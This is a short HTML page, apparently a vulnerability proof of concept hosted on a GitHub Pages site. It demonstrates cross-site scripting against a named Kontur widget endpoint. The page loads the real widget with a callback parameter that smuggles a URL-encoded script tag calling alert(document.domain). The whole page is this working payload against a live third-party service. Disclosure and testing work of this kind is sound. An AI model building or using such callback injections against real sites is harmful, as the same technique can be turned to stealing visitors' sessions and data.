# inoagent.github.io
<!DOCTYPE html>
<html>
<head>
  <title>XSS PoC - Kontur Widget</title>
</head>
<body>
  <h1>Kontur Widget XSS PoC</h1>
  <p>If you see an alert with the domain, the XSS is exploitable.</p>

  <!-- This is how the real widget is embedded -->
  <script 
    src="https://widget-product.kontur.ru/ajax/widget/body?product=ofd&type=Service&callback=%3Cscript%3Ealert(document.domain)%3C/script%3ELoadWidgetBodySuccess">
  </script>
</body>
</html>
